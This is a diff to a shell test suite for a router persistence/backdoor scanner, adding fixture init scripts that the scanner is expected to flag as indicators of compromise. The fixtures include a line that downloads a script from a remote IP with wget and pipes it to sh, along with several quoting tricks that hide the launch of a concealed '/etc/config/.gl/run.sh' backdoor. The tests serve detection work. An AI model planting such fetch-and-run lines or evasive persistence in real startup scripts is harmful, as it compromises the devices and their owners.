@@ -421,13 +421,6 @@ run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
 expect "a quoted & does not cut the fetch off: IOC persist-ref" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server"'
 expect "a quoted # starts no comment: IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/qhash" "$D/check.txt"'
 umount "$D/m"
-D=$(mkscen quotes2 "$OWL"); U=$D/u
-mkdir -p "$U/etc"
-printf 'DIRS="/etc/config/.gl/\n/etc/glinet/.cache/gb"\nfor d in $DIRS; do rm -rf "$d"; done\nlogger "guard:\ngl-helper not found"\nexit 0\n' >"$U/etc/rc.local"
-mnt "$D" "$OWL"
-run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
-expect "a string of data over two lines is not a command: no IOC (exit 0)" '[ $rc = 0 ] && ! grep -q "^ *IOC " "$D/check.txt" && grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt"'
-umount "$D/m"
 D=$(mkscen quotes3 "$OWL"); U=$D/u
 mkdir -p "$U/etc/init.d"
 printf 'cat > /tmp/a.sh <<EOF\nwget -qO- http://65.20.71.131:8000/ni.sh | sh\nEOF\nsh /tmp/a.sh\n' >"$U/etc/init.d/q-hd"
@@ -437,9 +430,14 @@ printf "echo it's\n/etc/config/.gl/run.sh &\n" >"$U/etc/init.d/q-open"
 printf 'watch -n 60 "true; /etc/config/.gl/run.sh" &\n' >"$U/etc/init.d/q-watch"
 { printf "awk '\n"; for i in $(seq 1 26); do printf '  /x/ { n++ }\n'; done; printf "' /proc/meminfo\n/etc/config/.gl/run.sh &\n"; } >"$U/etc/init.d/q-awk"
 printf 'ping -c1 adguardns.com\n/etc/config/.gl/run.sh &\n' >"$U/etc/init.d/q-guard"
+printf "echo '#!/bin/sh\n/etc/config/.gl/run.sh &' > /tmp/x.sh\nsh /tmp/x.sh\n" >"$U/etc/init.d/q-echo"
+printf 'x="$(: "\047")"; true; /etc/config/.gl/run.sh & y="$(: "\047")"\n' >"$U/etc/init.d/q-nest"
+printf "true;# don't\n/etc/config/.gl/run.sh &\ntrue;# isn't\n" >"$U/etc/init.d/q-hash"
+printf ": \$'\\\\'' ; /etc/config/.gl/run.sh & : \\\\'\n" >"$U/etc/init.d/q-dollar"
+printf 'CMD="sleep 5; /etc/config/.gl/run.sh"\nsh -c "$CMD" &\n' >"$U/etc/init.d/q-var"
 mnt "$D" "$OWL"
 run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
-expect "here-document run later, sh -c and echo over lines, an open quote, watch, a long string, a backdoor name: each IOC persist-ref" '[ $rc = 1 ] && ( for n in hd shc cron open watch awk guard; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
+expect "here-document run later, sh -c and echo over lines, an open quote, watch, a long string, a backdoor name: each IOC persist-ref" '[ $rc = 1 ] && ( for n in hd shc cron open watch awk guard echo nest hash dollar var; do grep -q "IOC  *persist-ref  */etc/init.d/q-$n" "$D/check.txt" || exit 1; done )'
 umount "$D/m"
 
 echo "=== owners who block the older backdoor's servers their own way (review of 2.54)"
